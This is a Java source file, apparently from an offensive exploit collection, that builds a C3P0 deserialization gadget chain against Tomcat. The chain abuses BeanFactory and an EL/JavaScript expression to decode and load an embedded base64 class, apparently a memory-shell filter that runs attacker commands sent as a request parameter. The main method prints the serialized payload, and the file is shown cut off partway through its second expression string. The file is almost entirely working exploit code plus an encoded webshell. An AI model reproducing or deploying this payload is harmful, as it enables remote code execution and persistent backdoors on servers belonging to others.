package gadget;

import com.fasterxml.jackson.databind.ser.Serializers;
import com.mchange.v2.c3p0.PoolBackedDataSource;
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import org.apache.naming.ResourceRef;
import util.ReflectionUtils;
import util.SerializerUtils;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.naming.StringRefAddr;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.*;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.Base64;
import java.util.logging.Logger;
//C3P0不出网利用
public class C3P0Tomcat {

    static String memshell = "yv66vgAAADQBxwoAdQD3CAD4CQA/APkKAAUA+gcA+woAXQD8CgD9AP4KAP0A/wcBAAcBAQoAXQECCgEDAQQKAQMBBQgAqgoAPwEGBwCrCgEDAQcIAQgKACYBCQgAmAcBCggBCwgAwggBDAcBDQgAmQcBDgoAGwEPCwEQARELARABEggAkwgAlAoBEwEUCgAFARUIAJUHARYIARcHARgKACQBGQoAJAEaCAEbCAEcCAEdCAEeCAEfCAEgCAEhCAClCAEiBwEjCACmCACiBwEkCQElASYKAScBKAoANQD/BwEpCAEqCgA1ASsLASwBDwoAJgEtBwEuBwEvCwEwATEKATIBMwoBMgE0BwE1BwE2CgE3ATgKAEQBOQoAQwE6BwE7CgBIAPcKAEMBPAoASAE9CgBIAT4KAEgBGQsBPwFACgAmAUEKAUIBQwoBQgFECgFCAUULAUYBRwoAPwFICAFJCAFKCAFLCgBdAUwHAU0IAU4KAF0BTwgBUAcBUQoAXQFSCgFTAVQKAD8A9wgBVQoAXQEHCAFWBwFXCAFYCAFZCAFaCAFbCQFcAV0KAVwBXggBXwgBYAgBYQcBYgcBYwoAXQFkCgFlAP4KAWUBZgoANQFnCgAZAWgHAWkBAAxjbWRQYXJhbU5hbWUBABJMamF2YS9sYW5nL1N0cmluZzsBAA1Db25zdGFudFZhbHVlAQAQZmlsdGVyVXJsUGF0dGVybgEACmZpbHRlck5hbWUBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJExnYWRnZXQvbWVtc2hlbGwvVG9tY2F0U2hlbGxJbmplY3QyOwEACGdldEZpZWxkAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBAA1kZWNsYXJlZEZpZWxkAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEABm9iamVjdAEAEkxqYXZhL2xhbmcvT2JqZWN0OwEACWZpZWxkTmFtZQEABWNsYXp6AQARTGphdmEvbGFuZy9DbGFzczsBAA1TdGFja01hcFRhYmxlBwFRBwFqAQARZ2V0U2VydmxldENvbnRleHQBACwoKUxvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvU3RhbmRhcmRDb250ZXh0OwEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAARuZXh0AQADcmVxAQAKc2VydmVyUG9ydAEADHNlcnZlck5hbWVNQgEAKUxvcmcvYXBhY2hlL3RvbWNhdC91dGlsL2J1Zi9NZXNzYWdlQnl0ZXM7AQAFdXJpTUIBAAZ0YXJnZXQBAApwcm9jZXNzb3JzAQAVTGphdmEvdXRpbC9BcnJheUxpc3Q7AQAIaXRlcmF0b3IBABRMamF2YS91dGlsL0l0ZXJhdG9yOwEABnRocmVhZAEAEkxqYXZhL2xhbmcvVGhyZWFkOwEACmNvbnRleHRLZXkBAA9zdGFuZGFyZENvbnRleHQBACpMb3JnL2FwYWNoZS9jYXRhbGluYS9jb3JlL1N0YW5kYXJkQ29udGV4dDsBAAhjaGlsZHJlbgEAE0xqYXZhL3V0aWwvSGFzaE1hcDsBAAtqaW9FbmRQb2ludAEAB3NlcnZpY2UBAAZlbmdpbmUBAClMb3JnL2FwYWNoZS9jYXRhbGluYS9jb3JlL1N0YW5kYXJkRW5naW5lOwEADHN0YW5kYXJkSG9zdAEAJ0xvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvU3RhbmRhcmRIb3N0OwEAB3RocmVhZHMBABNbTGphdmEvbGFuZy9UaHJlYWQ7AQADdXJpAQAKc2VydmVyTmFtZQcBGAcBawcA+wcBDQcBDgcBbAcBFgcBIwcBJAcBKQEACkV4Y2VwdGlvbnMBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwFtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAEaW5pdAEAHyhMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7KVYBAAxmaWx0ZXJDb25maWcBABxMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7BwFuAQAIZG9GaWx0ZXIBAFsoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlO0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOylWAQAHcHJvY2VzcwEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAA5idWZmZXJlZFJlYWRlcgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEADXN0cmluZ0J1aWxkZXIBABlMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAEbGluZQEADnNlcnZsZXRSZXF1ZXN0AQAeTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAPc2VydmxldFJlc3BvbnNlAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEAC2ZpbHRlckNoYWluAQAbTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47AQADY21kBwEvBwFvBwFwBwFxBwFyBwE1BwE7BwFzAQAHZGVzdHJveQEACDxjbGluaXQ+AQAiTGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uOwEADmZpbHRlckRlZkNsYXNzAQAJZmlsdGVyRGVmAQAGZmlsdGVyAQAWTGphdmF4L3NlcnZsZXQvRmlsdGVyOwEADmZpbHRlck1hcENsYXNzAQAJZmlsdGVyTWFwAQALY29uc3RydWN0b3IBAB9MamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7AQAyTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29yZS9BcHBsaWNhdGlvbkZpbHRlckNvbmZpZzsBAAVmaWVsZAEAA21hcAEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBAFlMamF2YS91dGlsL0hhc2hNYXA8TGphdmEvbGFuZy9TdHJpbmc7TG9yZy9hcGFjaGUvY2F0YWxpbmEvY29yZS9BcHBsaWNhdGlvbkZpbHRlckNvbmZpZzs+OwcBLgcBdAcBTQcBVwEAClNvdXJjZUZpbGUBABdUb21jYXRTaGVsbEluamVjdDIuamF2YQwAewB8AQAIc3F1aXJ0MWUMAHYAdwwBdQF2AQAQamF2YS9sYW5nL09iamVjdAwBdwF4BwF0DAF5AXoMAXsBfAEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgEAIGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uDAF9AXYHAWsMAX4BfwwBgAGBDACCAIMMAYIBgwEABGV4ZWMMAYQBhQEAEmphdmEvbGFuZy9SdW5uYWJsZQEABnRoaXMkMAEABmdsb2JhbAEAE2phdmEvbGFuZy9FeGNlcHRpb24BABNqYXZhL3V0aWwvQXJyYXlMaXN0DACbAYYHAWwMAYcBiAwAkgGJBwGKDAGLAYwMAY0BjgEAJ29yZy9hcGFjaGUvdG9tY2F0L3V0aWwvYnVmL01lc3NhZ2VCeXRlcwEACHN0clZhbHVlAQAQamF2YS9sYW5nL1N0cmluZwwBjwGDDAGQAYMBAAxkZWNvZGVkVXJpTUIBAAhBY2NlcHRvcgEABGh0dHABAAhlbmRwb2ludAEABXByb3RvAQAHYWRhcHRlcgEACWNvbm5lY3RvcgEACWNvbnRhaW5lcgEAJ29yZy9hcGFjaGUvY2F0YWxpbmEvY29yZS9TdGFuZGFyZEVuZ2luZQEAEWphdmEvdXRpbC9IYXNoTWFwBwGRDAGSAZMHAZQMAZUBlgEAJW9yZy9hcGFjaGUvY2F0YWxpbmEvY29yZS9TdGFuZGFyZEhvc3QBAAlsb2NhbGhvc3QMAZcBmAcBmQwBmgGbAQAob3JnL2FwYWNoZS9jYXRhbGluYS9jb3JlL1N0YW5kYXJkQ29udGV4dAEAImdhZGdldC9tZW1zaGVsbC9Ub21jYXRTaGVsbEluamVjdDIHAW8MAZwBnQcBngwBnwGgDAEIAaEBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgcBcgwBogGjDAB7AaQMAHsBpQEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDAGmAYMMAacBqAwBpwGpBwFwDAGqAasMAawBrQcBrgwBrwGwDAGxAHwMAbIAfAcBcQwAyQGzDACOAI8BAA1maWx0ZXJDb25maWdzAQAJd2hpdGVsaXN0AQAkb3JnLmFwYWNoZS5jYXRhbGluYS5kZXBsb3kuRmlsdGVyRGVmDAG0AbUBACBqYXZhL2xhbmcvQ2xhc3NOb3RGb3VuZEV4Y2VwdGlvbgEAL29yZy5hcGFjaGUudG9tY2F0LnV0aWwuZGVzY3JpcHRvci53ZWIuRmlsdGVyRGVmDAG2AYkBAA1zZXRGaWx0ZXJOYW1lAQAPamF2YS9sYW5nL0NsYXNzDAG3AbgHAbkMAboBuwEADnNldEZpbHRlckNsYXNzAQAJc2V0RmlsdGVyAQAUamF2YXgvc2VydmxldC9GaWx0ZXIBAAxhZGRGaWx0ZXJEZWYBACRvcmcuYXBhY2hlLmNhdGFsaW5hLmRlcGxveS5GaWx0ZXJNYXABAC9vcmcuYXBhY2hlLnRvbWNhdC51dGlsLmRlc2NyaXB0b3Iud2ViLkZpbHRlck1hcAEADXNldERpc3BhdGNoZXIHAbwMAb0BvgwBvwGDAQANYWRkVVJMUGF0dGVybgEAAi8qAQASYWRkRmlsdGVyTWFwQmVmb3JlAQAwb3JnL2FwYWNoZS9jYXRhbGluYS9jb3JlL0FwcGxpY2F0aW9uRmlsdGVyQ29uZmlnAQAbb3JnL2FwYWNoZS9jYXRhbGluYS9Db250ZXh0DAHAAcEHAcIMAbYBwwwBxAHFDAHGAHwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAmamF2YS9sYW5nL1JlZmxlY3RpdmVPcGVyYXRpb25FeGNlcHRpb24BABBqYXZhL2xhbmcvVGhyZWFkAQASamF2YS91dGlsL0l0ZXJhdG9yAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAZamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbgEAEWphdmEvbGFuZy9Qcm9jZXNzAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAA1nZXRTdXBlcmNsYXNzAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAOZ2V0VGhyZWFkR3JvdXABABkoKUxqYXZhL2xhbmcvVGhyZWFkR3JvdXA7AQAHZ2V0TmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABYoKUxqYXZhL3V0aWwvSXRlcmF0b3I7AQAHaGFzTmV4dAEAAygpWgEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQARamF2YS9sYW5nL0ludGVnZXIBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEACHRvU3RyaW5nAQAJZ2V0U3RyaW5nAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvT2JqZWN0OylWAQAGa2V5U2V0AQARKClMamF2YS91dGlsL1NldDsBAA1qYXZhL3V0aWwvU2V0AQAKc3RhcnRzV2l0aAEAFShMamF2YS9sYW5nL1N0cmluZzspWgEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEAEyhMamF2YS9pby9SZWFkZXI7KVYBAAhyZWFkTGluZQEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAHChDKUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAA9nZXRPdXRwdXRTdHJlYW0BACUoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRPdXRwdXRTdHJlYW07AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAhamF2YXgvc2VydmxldC9TZXJ2bGV0T3V0cHV0U3RyZWFtAQAFd3JpdGUBAAUoW0IpVgEABWZsdXNoAQAFY2xvc2UBAEAoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAtuZXdJbnN0YW5jZQEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZh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";
    public static void main(String[] args) throws Exception {
        C3P0Tomcat c3P0 = new C3P0Tomcat();
        Object object = c3P0.getObject();

        System.out.println(Base64.getEncoder().encodeToString(SerializerUtils.serialize(object)));

//        unserialize();
    }
    public Object getObject () throws Exception {
        PoolBackedDataSource b=new PoolBackedDataSource();
        ReflectionUtils.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource("org.apache.naming.factory.BeanFactory", null));
        return b;
    }
    private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {

        private String className;
        private String url;

        public PoolSource ( String className, String url ) {
            this.className = className;
            this.url = url;
        }

        @Override
        public Reference getReference() {
            //究极内存马
            String expression="''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval('var classLoader = java.lang.Thread.currentThread().getContextClassLoader();try{classLoader.loadClass(\\'Injext\\').newInstance();}catch (e){var clsString = classLoader.loadClass(\\'java.lang.String\\');var bytecodeBase64 = \\'"+memshell+"\\';var bytecode;try{var clsBase64 = classLoader.loadClass(\\'java.util.Base64\\');var clsDecoder = classLoader.loadClass(\\'java.util.Base64$Decoder\\');var decoder = clsBase64.getMethod(\\'getDecoder\\').invoke(base64Clz);bytecode = clsDecoder.getMethod(\\'decode\\', clsString).invoke(decoder, bytecodeBase64);} catch (ee) {try {var datatypeConverterClz = classLoader.loadClass(\\'javax.xml.bind.DatatypeConverter\\');bytecode = datatypeConverterClz.getMethod(\\'parseBase64Binary\\', clsString).invoke(datatypeConverterClz, bytecodeBase64);} catch (eee) {var clazz1 = classLoader.loadClass(\\'sun.misc.BASE64Decoder\\');bytecode = clazz1.newInstance().decodeBuffer(bytecodeBase64);}}var clsClassLoader = classLoader.loadClass(\\'java.lang.ClassLoader\\');var clsByteArray = (new java.lang.String(\\'a\\').getBytes().getClass());var clsInt = java.lang.Integer.TYPE;var defineClass = clsClassLoader.getDeclaredMethod(\\'defineClass\\', [clsByteArray, clsInt, clsInt]);defineClass.setAccessible(true);var clazz = defineClass.invoke(classLoader,bytecode,new java.lang.Integer(0),new java.lang.Integer(bytecode.length));clazz.newInstance();}')";
            expression="''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval('var classLoader = java.lang.Thread.currentThread().getContextClassLoader();var clsString = classLoader.loadClass(\\'java.lang.String\\');var bytecodeBase64 = \\'"+memshell+"\\';var bytecode;try{var clsBase64 = classLoader.loadClass(\\'java.util.Base64\\');var clsDecoder = classLoader.loadClass(\\'java.util.Base64.Decoder\\');var decoder = clsBase64.getMethod(\\'getDecoder\\').invoke(base64Clz);bytecode = clsDecoder.getMethod(\\'decode\\', clsString).invoke(decoder, bytecodeBase64);} catch (ee) {try {var datatypeConverterClz = classLoader.loadClass(\\'javax.xml.bind.DatatypeConverter\\');bytecode = datatypeConverterClz.getMethod(\\'parseBase64Binary\\', clsString).invoke(datatypeConverterClz, bytecodeBase64);} catch (eee) {var clazz1 = classLoader.loadClass(\\'sun.misc.BASE64Decoder\\');bytecode = clazz1.newInstance().decodeBuffer(bytecodeBase64);}}var clsClassLoader = classLoader.loadClass(\\'java.lang.ClassLoader\\');var clsByteArray = (new java.lang.String(\\'a\\').getBytes().getClass());var clsInt = java.lang.Integer.TYPE;var defineClass = clsClassLoader.getDeclaredMethod(\\'defineClass\\', [clsByteArray, clsInt, clsInt]);defineClass.setAccessible(true);var clazz = defineClass.invoke(classLoader,bytecode,new 